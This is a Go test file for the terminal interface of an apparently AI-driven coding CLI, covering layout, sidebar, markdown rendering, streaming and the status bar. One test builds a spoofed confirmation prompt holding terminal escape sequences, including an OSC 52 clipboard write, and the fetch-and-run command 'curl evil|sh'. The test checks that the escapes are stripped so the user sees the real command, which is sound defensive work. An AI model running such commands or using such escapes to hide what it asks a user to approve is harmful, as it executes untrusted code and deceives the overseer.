package tui

import (
	"fmt"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/x/ansi"

	"github.com/rushikeshg25/cool-code/internal/types"
)

func resizeModel(t *testing.T, m *model, width, height int) *model {
	t.Helper()
	updated, _ := m.Update(tea.WindowSizeMsg{Width: width, Height: height})
	return updated.(*model)
}

func assertFitsTerminal(t *testing.T, view string, width, height int) {
	t.Helper()
	if got := lipgloss.Height(view); got > height {
		t.Fatalf("view height = %d, terminal height = %d\n%s", got, height, ansi.Strip(view))
	}
	for i, line := range strings.Split(view, "\n") {
		if got := lipgloss.Width(line); got > width {
			t.Fatalf("line %d width = %d, terminal width = %d\n%s", i+1, got, width, ansi.Strip(line))
		}
	}
}

func TestResponsiveViewFitsCommonTerminalSizes(t *testing.T) {
	states := []struct {
		name  string
		setup func(*model)
	}{
		{"idle", func(m *model) {}},
		{"processing", func(m *model) {
			m.processing = true
			m.status = "Reading the project and running several tools…"
			m.subagents = []string{"agent 1: inspect the terminal renderer - exploring (4 tools)"}
			m.ti.SetValue("a queued follow-up remains visible")
		}},
		{"command palette", func(m *model) {
			m.ti.SetValue("/")
			m.refreshSuggestions()
		}},
		{"tasks", func(m *model) {
			m.tasks = &types.TaskList{Goal: "Refresh the terminal interface", Items: []types.TaskItem{
				{ID: "1", Title: "Audit layout", Status: types.TaskDone},
				{ID: "2", Title: "Implement a compact responsive composer", Status: types.TaskInProgress},
				{ID: "3", Title: "Verify", Status: types.TaskTodo},
			}}
		}},
		{"confirmation", func(m *model) {
			var lines []string
			for i := 0; i < 30; i++ {
				lines = append(lines, fmt.Sprintf("+ changed line %d with enough text to wrap safely", i+1))
			}
			m.confirmMsg = "Apply this edit?\n" + strings.Join(lines, "\n")
		}},
	}

	// 100x30 is the sidebar breakpoint and 99 is one column below it, so both
	// sides of the split are exercised. 160x50 gives the sidebar room to spare.
	sizes := [][2]int{{60, 18}, {72, 20}, {80, 24}, {99, 30}, {100, 30}, {120, 40}, {160, 50}, {40, 12}}
	for _, state := range states {
		for _, size := range sizes {
			t.Run(fmt.Sprintf("%s/%dx%d", state.name, size[0], size[1]), func(t *testing.T) {
				m := newTestModel(t)
				state.setup(m)
				m = resizeModel(t, m, size[0], size[1])
				assertFitsTerminal(t, m.View(), size[0], size[1])
			})
		}
	}
}

func TestComposerRemainsVisibleWhileProcessing(t *testing.T) {
	m := newTestModel(t)
	m.processing = true
	m.status = "Thinking…"
	m.ti.SetValue("please also run the tests")
	view := ansi.Strip(m.View())
	for _, want := range []string{"Thinking", "Esc cancel", "please also run the tests", "Enter queue follow-up"} {
		if !strings.Contains(view, want) {
			t.Fatalf("processing view missing %q:\n%s", want, view)
		}
	}
}

func TestCommandPaletteIsBounded(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 80, 24)
	m.ti.SetValue("/")
	m.refreshSuggestions()
	rendered := ansi.Strip(m.renderSuggestions())
	if got, max := len(strings.Split(rendered, "\n")), m.menuLimit()+1; got > max {
		t.Fatalf("palette uses %d lines, want at most %d\n%s", got, max, rendered)
	}
	if !strings.Contains(rendered, fmt.Sprintf("1/%d", len(commands))) {
		t.Fatalf("bounded palette should show its position:\n%s", rendered)
	}
}

func TestConfirmationScrollsWithoutGrowing(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 60, 18)
	m.confirmMsg = strings.Repeat("+ a changed line that should remain within the overlay\n", 20)
	firstHeight := lipgloss.Height(m.renderConfirmation())
	updated, _ := m.Update(tea.KeyMsg{Type: tea.KeyDown})
	m = updated.(*model)
	if m.confirmOff != 1 {
		t.Fatalf("confirmation offset = %d, want 1", m.confirmOff)
	}
	if got := lipgloss.Height(m.renderConfirmation()); got != firstHeight {
		t.Fatalf("scrolled confirmation height = %d, want %d", got, firstHeight)
	}
}

func TestVisibleWindowTracksSelection(t *testing.T) {
	if start, end := visibleWindow(12, 10, 6); start != 6 || end != 12 {
		t.Fatalf("visibleWindow = %d:%d, want 6:12", start, end)
	}
}

func TestTerminalColorResponseDoesNotEnterComposer(t *testing.T) {
	m := newTestModel(t)
	terminalReply := "\x1b]11;rgb:3131/3636/3b3b\x1b\\"
	updated, _ := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune(terminalReply)})
	m = updated.(*model)
	if got := m.ti.Value(); got != "" {
		t.Fatalf("terminal color response leaked into composer: %q", got)
	}
}

// TestActivityRendersAboveTaskAndStatus covers the stacked layout, which is
// what a terminal narrower than the sidebar breakpoint gets. Above that width
// the task summary moves into the sidebar, covered separately below.
func TestActivityRendersAboveTaskAndStatus(t *testing.T) {
	m := newTestModel(t)
	m.processing = true
	m.status = "Thinking…"
	m.tasks = &types.TaskList{Goal: "Build a todo app", Items: []types.TaskItem{
		{ID: "1", Title: "Inspect the project", Status: types.TaskInProgress},
	}}
	m = resizeModel(t, m, 80, 24)

	footer := ansi.Strip(m.footer())
	activity := strings.Index(footer, "Thinking")
	plan := strings.Index(footer, "Plan")
	// "ctx" belongs to the status bar alone; the mode moved to the header.
	status := strings.Index(footer, "ctx")
	if activity < 0 || plan < 0 || status < 0 || !(activity < plan && plan < status) {
		t.Fatalf("footer order should be activity, plan, status:\n%s", footer)
	}
}

// TestSidebarShowsIndividualTasks covers the wide layout. The old task panel
// was one aggregated line; the items existed in the model but were never drawn.
func TestSidebarShowsIndividualTasks(t *testing.T) {
	m := newTestModel(t)
	m.tasks = &types.TaskList{Goal: "Build a todo app", Items: []types.TaskItem{
		{ID: "1", Title: "Inspect", Status: types.TaskDone},
		{ID: "2", Title: "Refactor", Status: types.TaskInProgress},
		{ID: "3", Title: "Verify", Status: types.TaskTodo},
	}}
	m.subagents = []string{"agent 1: explore - exploring"}
	m = resizeModel(t, m, 120, 40)

	view := ansi.Strip(m.View())
	for _, want := range []string{"Tasks", "1/3", "Inspect", "Refactor", "Verify", "Agents"} {
		if !strings.Contains(view, want) {
			t.Errorf("sidebar missing %q:\n%s", want, view)
		}
	}
	// The rule runs the full height, header row included, so the two columns
	// read as panes rather than the header spanning both.
	first := strings.Split(view, "\n")[0]
	if !strings.Contains(first, "│") {
		t.Errorf("header row is not split by the rule: %q", first)
	}
	if !strings.Contains(first, "Tasks") {
		t.Errorf("sidebar has no title on the header row: %q", first)
	}
	// The stacked task summary must not also be drawn.
	if strings.Contains(ansi.Strip(m.footer()), "Plan 1/3") {
		t.Error("task summary duplicated in the footer while the sidebar is shown")
	}
}

// TestHeaderIsPersistent covers the row that replaced the scrolling banner.
func TestHeaderIsPersistent(t *testing.T) {
	m := newTestModel(t)
	m = resizeModel(t, m, 120, 40)
	first := ansi.Strip(strings.Split(m.View(), "\n")[0])
	if !strings.Contains(first, "cool-code") {
		t.Errorf("header missing from the first row: %q", first)
	}
	// It survives a transcript long enough to have scrolled the banner away.
	for i := 0; i < 200; i++ {
		m.appendAssistant("line")
	}
	first = ansi.Strip(strings.Split(m.View(), "\n")[0])
	if !strings.Contains(first, "cool-code") {
		t.Errorf("header scrolled away: %q", first)
	}
}

func TestMarkdownResponseHasCompactSpacing(t *testing.T) {
	rendered := ansi.Strip(renderMarkdown("## Context\n\nThe project is a Go CLI.\n\n- First fact\n- Second fact", 80))
	for i, line := range strings.Split(rendered, "\n") {
		if strings.TrimRight(line, " ") != line {
			t.Fatalf("markdown line %d has padded trailing spaces: %q", i+1, line)
		}
	}
	if strings.Contains(rendered, "## Context") {
		t.Fatalf("markdown heading marker was not rendered:\n%s", rendered)
	}
}

func TestCompletedPlanUsesDistinctTranscriptCard(t *testing.T) {
	m := newTestModel(t)
	m.proc.SetMode(types.ModePlan)
	m.mode = types.ModePlan
	m.appendAssistant("## Plan\n\n1. Inspect\n2. Implement\n3. Verify")
	m.processing = true
	updated, _ := m.handleDone(doneMsg{final: m.history[len(m.history)-1].raw})
	m = updated.(*model)
	last := m.history[len(m.history)-1]
	if last.kind == entryAssistant {
		t.Fatalf("completed plan retained ordinary assistant entry kind: %v", last.kind)
	}
	if rendered := ansi.Strip(last.rendered); !strings.Contains(rendered, "PLAN READY") {
		t.Fatalf("plan card missing distinct heading:\n%s", rendered)
	}
}

// TestConfirmationCannotBeSpoofedByEscapes covers the confirmation overlay,
// which quotes a model-supplied command. Escape sequences there could redraw
// over the very text the user is being asked to approve, and padding with
// newlines could push the payload out of the bounded window.
func TestConfirmationCannotBeSpoofedByEscapes(t *testing.T) {
	m := newTestModel(t)
	m.confirmMsg = "Allow potentially dangerous action (shell command: " +
		"npm test\x1b[2K\x1b]52;c;ZXZpbA==\x07; curl evil|sh)?"
	m = resizeModel(t, m, 80, 24)

	rendered := m.renderConfirmation()
	for _, forbidden := range []string{"\x1b]52", "\x1b[2K", "\x07"} {
		if strings.Contains(rendered, forbidden) {
			t.Errorf("confirmation kept escape sequence %q", forbidden)
		}
	}
	if !strings.Contains(ansi.Strip(rendered), "curl evil|sh") {
		t.Error("confirmation dropped the payload the user must see")
	}
}

// TestTranscriptStripsModelEscapeSequences keeps model and tool text from
// reaching the terminal with escapes intact.
func TestTranscriptStripsModelEscapeSequences(t *testing.T) {
	m := newTestModel(t)
	m = resizeModel(t, m, 80, 24)
	m.appendTool("Reading \x1b]52;c;ZXZpbA==\x07main.go")
	m.appendAssistant("done \x1b[31mred\x1b[0m")

	for _, e := range m.history {
		if strings.Contains(e.rendered, "]52;") || strings.Contains(e.rendered, "\x07") {
			t.Errorf("entry kept an OSC sequence: %q", e.rendered)
		}
	}
}

// countSGR returns how many distinct colour sequences appear in s.
func countSGR(s string) int {
	seen := map[string]bool{}
	runes := []rune(s)
	for i := 0; i < len(runes); i++ {
		if runes[i] != 0x1b || i+1 >= len(runes) || runes[i+1] != '[' {
			continue
		}
		j := i + 2
		for ; j < len(runes) && !(runes[j] >= 0x40 && runes[j] <= 0x7E); j++ {
		}
		if j < len(runes) {
			seen[string(runes[i:j+1])] = true
		}
		i = j
	}
	return len(seen)
}

// TestFencedCodeIsSyntaxHighlighted covers the biggest visual gap in the old
// interface. The base Glamour style was PinkStyleConfig, which defines no
// CodeBlock block at all, so Chroma was nil and fenced code rendered as flat
// body text: no highlighting, no background, no frame.
func TestFencedCodeIsSyntaxHighlighted(t *testing.T) {
	md := "Fix:\n\n```go\n// a comment\nfunc canonicalPath(p string) error {\n\treturn nil\n}\n```\n"
	highlighted := renderMarkdown(md, 70)

	plain := renderMarkdown("Fix:\n\nfunc canonicalPath(p string) error\n", 70)
	if countSGR(highlighted) <= countSGR(plain) {
		t.Errorf("fenced code is not highlighted: %d colours vs %d for prose",
			countSGR(highlighted), countSGR(plain))
	}
	// The code itself must survive intact.
	for _, want := range []string{"canonicalPath", "// a comment", "return nil"} {
		if !strings.Contains(ansi.Strip(highlighted), want) {
			t.Errorf("code block lost %q", want)
		}
	}
}

// TestMarkdownUsesThePalette keeps Glamour from reintroducing colours that
// belong to no part of this theme. PinkStyleConfig left HorizontalRule at
// "212", a hot pink, and headings were set to the ANSI-256 literal "99".
func TestMarkdownUsesThePalette(t *testing.T) {
	out := renderMarkdown("# Title\n\n---\n\nInline `code` here.\n", 70)
	for _, forbidden := range []string{"38;5;212", "38;5;99"} {
		if strings.Contains(out, forbidden) {
			t.Errorf("markdown emitted off-palette colour %q", forbidden)
		}
	}
	if !strings.Contains(ansi.Strip(out), "Title") {
		t.Error("heading text was lost")
	}
}

// TestErrorsAreVisuallyDistinct covers the hierarchy problem. Errors were
// routed to entrySystem, which renders faint and italic, so a failure was the
// least prominent text on screen, and danger was used nowhere but diff lines.
func TestErrorsAreVisuallyDistinct(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 100, 30)
	m.appendSystem("Mode switched to PLAN")
	m.appendError("provider returned 500")

	var system, failure string
	for _, e := range m.history {
		switch e.kind {
		case entrySystem:
			system = e.rendered
		case entryError:
			failure = e.rendered
		}
	}
	if failure == "" {
		t.Fatal("error entry was not recorded")
	}
	// Colour is stripped when tests run without a TTY, so assert on the
	// structural difference the marker gives, not on the SGR codes.
	if ansi.Strip(failure) == ansi.Strip(system) {
		t.Error("errors render the same as ordinary system notices")
	}
	if !strings.Contains(ansi.Strip(failure), "⚠") {
		t.Errorf("error has no marker distinguishing it: %q", ansi.Strip(failure))
	}
	if !strings.Contains(ansi.Strip(failure), "provider returned 500") {
		t.Errorf("error text lost: %q", ansi.Strip(failure))
	}
}

// TestFailedToolLooksDifferentFromSuccess covers the other half: a failed tool
// call used to render as the same muted branch line as a successful one.
func TestFailedToolLooksDifferentFromSuccess(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 100, 30)
	m.appendToolResult("Reading main.go", false)
	m.appendToolResult("Read failed", true)

	ok := m.history[len(m.history)-2]
	bad := m.history[len(m.history)-1]
	if ok.kind == bad.kind {
		t.Fatal("failed and successful tool calls share an entry kind")
	}
	if ansi.Strip(bad.rendered) == ansi.Strip(ok.rendered) {
		t.Error("failed tool call renders identically to a successful one")
	}
	if !strings.Contains(ansi.Strip(bad.rendered), "✗") {
		t.Errorf("failed tool call has no failure marker: %q", ansi.Strip(bad.rendered))
	}
}

// TestTranscriptPrefixCacheMatchesFullRebuild guards the streaming fast path.
// appendDelta calls syncViewport once per token, and rebuilding the whole
// history each time is O(history) per token, so all but the last entry are
// cached. The cached result must equal what a full rebuild would produce.
func TestTranscriptPrefixCacheMatchesFullRebuild(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 100, 30)
	m.appendUser("do the thing")
	m.appendTool("Reading a.go")
	m.appendToolResult("Read failed", true)
	m.appendAssistant("Here is **the** answer.")
	m.appendSystem("Mode switched to PLAN")

	cached := m.vp.View()
	m.invalidatePrefix()
	m.syncViewport()
	if full := m.vp.View(); full != cached {
		t.Errorf("prefix cache diverged from a full rebuild:\ncached:\n%s\nfull:\n%s", cached, full)
	}
}

// TestStreamingUpdatesDoNotDisturbEarlierEntries covers the same path while a
// response is arriving one fragment at a time.
func TestStreamingUpdatesDoNotDisturbEarlierEntries(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 100, 30)
	m.appendUser("stream please")
	m.appendTool("Reading a.go")

	for _, frag := range []string{"Hel", "lo ", "wor", "ld"} {
		m.appendDelta(frag)
	}
	streamed := m.vp.View()

	m.invalidatePrefix()
	m.syncViewport()
	if full := m.vp.View(); full != streamed {
		t.Errorf("streamed transcript diverged from a full rebuild:\n%s\n---\n%s", streamed, full)
	}
	if !strings.Contains(ansi.Strip(streamed), "Hello world") {
		t.Errorf("streamed text incomplete: %q", ansi.Strip(streamed))
	}
}

// TestOnlyOneHeaderIsRendered covers the duplicate banner. The persistent
// header was added in v2.3.0 but the banner it replaced was still being pushed
// in as transcript entry zero, so the name and version appeared twice, stacked.
func TestOnlyOneHeaderIsRendered(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 120, 40)
	m.appendSystem("No API key configured - run /connect to link a provider.")

	view := ansi.Strip(m.View())
	if n := strings.Count(view, "cool-code v"); n != 1 {
		t.Errorf("found %d version headers, want 1:\n%s", n, view)
	}
	// The notice itself must survive as an ordinary transcript entry.
	if !strings.Contains(view, "No API key configured") {
		t.Error("startup notice was lost")
	}
}

// TestSidebarOnlyAppearsWithContent covers the idle layout. The sidebar used to
// be gated on width alone, so an empty session gave up a full-height column to
// print "No active tasks".
func TestSidebarOnlyAppearsWithContent(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 120, 40)
	if m.layout.showSidebar {
		t.Error("sidebar shown with no tasks and no agents")
	}
	if strings.Contains(ansi.Strip(m.View()), "No active tasks") {
		t.Error("placeholder text still rendered")
	}
	if m.layout.transcriptWidth != 120 {
		t.Errorf("transcript width = %d, want the full 120", m.layout.transcriptWidth)
	}

	m.tasks = &types.TaskList{Goal: "g", Items: []types.TaskItem{
		{ID: "1", Title: "Audit layout", Status: types.TaskTodo},
	}}
	m = resizeModel(t, m, 120, 40)
	if !m.layout.showSidebar {
		t.Fatal("sidebar hidden despite a task list")
	}
	if !strings.Contains(ansi.Strip(m.View()), "Audit layout") {
		t.Error("task item not shown in the sidebar")
	}

	// A running subagent is enough on its own.
	m.tasks = nil
	m.subagents = []string{"agent 1: explore"}
	m = resizeModel(t, m, 120, 40)
	if !m.layout.showSidebar {
		t.Error("sidebar hidden despite a running subagent")
	}
}

// TestSessionStateLivesInTheStatusBar covers the placement: mode, model and
// effort sit next to the composer that acts on them, and the header carries
// identity only, so neither is a repeat of the other.
func TestSessionStateLivesInTheStatusBar(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 120, 40)

	header := ansi.Strip(m.renderHeader(m.layout))
	status := ansi.Strip(m.renderStatusBar(m.layout))

	for _, field := range []string{"agent", "gemini-2.5-flash"} {
		if !strings.Contains(status, field) {
			t.Errorf("status bar lost %q: %q", field, status)
		}
		if strings.Contains(header, field) {
			t.Errorf("header still carries %q: %q", field, header)
		}
	}
	if !strings.Contains(header, "cool-code") {
		t.Errorf("header lost its identity: %q", header)
	}
	if !strings.Contains(status, "ctx") {
		t.Errorf("status bar lost the context figure: %q", status)
	}
}

// TestStatusBarShedsInOrderOnNarrowTerminals keeps the fields that matter most
// when there is no room for all of them. Mode governs what the agent may do, so
// it is the last to go.
func TestStatusBarShedsInOrderOnNarrowTerminals(t *testing.T) {
	narrow := ansi.Strip(resizeModel(t, newTestModel(t), 50, 20).renderStatusBar(layout{}))
	if !strings.Contains(narrow, "agent") {
		t.Errorf("mode dropped on a narrow terminal: %q", narrow)
	}
	if strings.Contains(narrow, "msgs") {
		t.Errorf("message count kept on a narrow terminal: %q", narrow)
	}

	wide := ansi.Strip(resizeModel(t, newTestModel(t), 120, 40).renderStatusBar(layout{}))
	for _, want := range []string{"agent", "gemini-2.5-flash", "msgs"} {
		if !strings.Contains(wide, want) {
			t.Errorf("wide status bar missing %q: %q", want, wide)
		}
	}
}

// TestContextIsShownAsAPercentage covers the status bar figure. An absolute
// token count says little without the window it sits in.
func TestContextIsShownAsAPercentage(t *testing.T) {
	cases := []struct {
		used, max int
		want      string
	}{
		{0, 120000, "0% ctx"},
		{12000, 120000, "10% ctx"},
		{60000, 120000, "50% ctx"},
		{119000, 120000, "99% ctx"},
		// Not clamped: the system prompt and pinned files sit outside the
		// window, so a real request can exceed it, and that is worth seeing.
		{150000, 120000, "125% ctx"},
		// No window configured falls back to the absolute count.
		{2500, 0, "2.5k ctx"},
	}
	for _, c := range cases {
		if got := formatContext(c.used, c.max); got != c.want {
			t.Errorf("formatContext(%d, %d) = %q, want %q", c.used, c.max, got, c.want)
		}
	}
}

// TestStreamingRendersCompletedBlocks covers the raw markdown problem. While
// streaming, the entry was plain-wrapped, so a long answer showed "## Steps"
// and "**bold**" literally for its whole duration and only formatted once the
// last fragment arrived.
func TestStreamingRendersCompletedBlocks(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 76, 24)
	plan := "## Steps\n\n1. **Rewrite the header**\n   - Keep the name.\n\n2. **Still arriv"
	for _, chunk := range strings.SplitAfter(plan, "\n") {
		m.appendDelta(chunk)
	}
	got := ansi.Strip(m.history[m.streamIdx].rendered)

	// Completed blocks are formatted: the markup itself is gone.
	if strings.Contains(got, "## Steps") {
		t.Errorf("completed heading still shows its markup:\n%s", got)
	}
	if strings.Contains(got, "**Rewrite the header**") {
		t.Errorf("completed bold still shows its markup:\n%s", got)
	}
	if !strings.Contains(got, "Rewrite the header") {
		t.Errorf("completed block lost its text:\n%s", got)
	}
	// The block still arriving stays plain, so a half-written bold does not
	// render wrong and then snap.
	if !strings.Contains(got, "**Still arriv") {
		t.Errorf("in-progress block should stay plain:\n%s", got)
	}
}

// TestSplitCompletedBlocks pins the boundary the renderer splits on.
func TestSplitCompletedBlocks(t *testing.T) {
	cases := []struct {
		raw, stable, tail string
	}{
		{"no blank line yet", "", "no blank line yet"},
		{"first\n\nsecond", "first", "second"},
		{"first\n\nsecond\n\nthird", "first\n\nsecond", "third"},
		{"trailing\n\n", "trailing", ""},
		{"", "", ""},
	}
	for _, c := range cases {
		stable, tail := splitCompletedBlocks(c.raw)
		if stable != c.stable || tail != c.tail {
			t.Errorf("splitCompletedBlocks(%q) = (%q, %q), want (%q, %q)",
				c.raw, stable, tail, c.stable, c.tail)
		}
	}
}

// TestStreamCacheMatchesUncachedRender guards the per-block cache: rendering
// the stable part once per completed block must equal rendering it fresh.
func TestStreamCacheMatchesUncachedRender(t *testing.T) {
	text := "# Title\n\nOne.\n\nTwo **bold**.\n\n- a\n- b\n\ntail in progress"

	streamed := resizeModel(t, newTestModel(t), 76, 24)
	for _, chunk := range strings.SplitAfter(text, "\n") {
		streamed.appendDelta(chunk)
	}

	fresh := resizeModel(t, newTestModel(t), 76, 24)
	fresh.appendDelta(text)

	if a, b := streamed.history[0].rendered, fresh.history[0].rendered; a != b {
		t.Errorf("cached stream render differs from a single-shot render:\n%q\n---\n%q", a, b)
	}
}

// TestActivityShowsElapsedTime covers what replaced the random flavour text.
// The status line used to pick from a list of phrases that described nothing
// and changed every turn; it now says what is happening and for how long.
func TestActivityShowsElapsedTime(t *testing.T) {
	m := resizeModel(t, newTestModel(t), 100, 30)
	m.processing = true
	m.status = "Thinking…"

	// Under a second there is nothing worth showing.
	m.turnStart = time.Now()
	if got := ansi.Strip(m.renderActivity()); strings.Contains(got, "0s") {
		t.Errorf("sub-second elapsed should be hidden: %q", got)
	}

	m.turnStart = time.Now().Add(-12 * time.Second)
	if got := ansi.Strip(m.renderActivity()); !strings.Contains(got, "Thinking… 12s") {
		t.Errorf("activity = %q, want it to carry the elapsed seconds", got)
	}

	m.turnStart = time.Now().Add(-95 * time.Second)
	if got := ansi.Strip(m.renderActivity()); !strings.Contains(got, "1m35s") {
		t.Errorf("activity = %q, want minutes and seconds past a minute", got)
	}
}

// TestElapsedIsIdleBeforeATurn keeps a stale figure from appearing when no turn
// is running.
func TestElapsedIsIdleBeforeATurn(t *testing.T) {
	m := newTestModel(t)
	if got := m.elapsed(); got != "" {
		t.Errorf("elapsed before any turn = %q, want empty", got)
	}
}
